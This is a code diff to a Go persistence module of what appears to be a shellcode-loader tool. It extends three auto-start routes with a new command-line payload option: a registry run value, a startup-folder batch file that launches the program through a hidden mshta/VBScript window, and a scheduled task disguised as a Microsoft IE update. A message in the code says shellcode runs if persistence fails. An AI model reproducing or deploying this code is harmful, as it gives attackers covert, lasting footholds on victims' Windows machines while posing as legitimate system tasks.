@@ -15,6 +15,18 @@ var (
 	TaskName = "MicrosoftIEUpdateTaskMachineCore" //任务名
 )
 
+func init() {
+	//获取程序目录
+	appPath, _ = os.Executable()
+	//获取随机数
+	if s, isRand := GetRand(); isRand == nil {
+		rand = s
+	} else {
+		rand = "ZheTian"
+	}
+}
+
+//StartUp 开机自启模块
 func StartUp() {
 	if err := regEdit(); err == nil {
 		fmt.Println("已在注册表添加启动项")
@@ -29,17 +41,6 @@ func StartUp() {
 		return
 	}
 	fmt.Println("设置自启失败，即将执行shell code")
-}
-
-func init() {
-	//获取程序目录
-	appPath, _ = os.Executable()
-	//获取随机数
-	if s, isRand := GetRand(); isRand == nil {
-		rand = s
-	} else {
-		rand = "ZheTian"
-	}
 }
 
 //regEdit 添加注册表
@@ -61,6 +62,9 @@ func regEdit() error {
 	}
 	if Resource != "" {
 		commLine = fmt.Sprintf("cmd.exe /c  %s -s %s", appPath, Resource)
+	}
+	if CommLineCode != "" {
+		commLine = fmt.Sprintf("cmd.exe /c  %s -c %s", appPath, CommLineCode)
 	}
 	err = key.SetStringValue(rand, commLine)
 
@@ -95,6 +99,13 @@ mshta vbscript:createobject("wscript.shell").run("%s -s %s h",0)(window.close)&&
 `, appPath, Resource)
 	}
 
+	if CommLineCode != "" {
+		startBat = fmt.Sprintf(`
+@echo off 　　 
+mshta vbscript:createobject("wscript.shell").run("%s -c %s h",0)(window.close)&&exit 
+`, appPath, CommLineCode)
+	}
+
 	startPath += rand + ".bat"
 
 	file, err := os.Create(startPath)
@@ -117,6 +128,10 @@ func schTask() error {
 	}
 	if Resource != "" {
 		commLine = fmt.Sprintf(`"cmd.exe /c %s -s %s" `, appPath, Resource)
+	}
+
+	if CommLineCode != "" {
+		commLine = fmt.Sprintf(`"cmd.exe /c %s -c %s" `, appPath, CommLineCode)
 	}
 	create := []string{
 		"/Create",
